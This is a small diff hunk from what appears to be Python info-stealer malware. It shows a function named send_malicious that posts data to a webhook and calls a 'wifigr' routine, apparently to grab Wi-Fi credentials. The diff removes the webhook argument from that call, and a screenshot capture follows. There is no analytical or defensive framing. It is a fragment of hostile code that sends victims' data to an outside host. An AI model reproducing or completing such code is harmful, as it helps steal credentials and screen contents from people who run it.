@@ -789,7 +789,7 @@ def send_malicious():
 
     requests.post(webhook, json={"embeds": [embed]})
     
-    malicious.wifigr(webhook=webhook)
+    malicious.wifigr()
 
 
 screenshot = ImageGrab.grab()
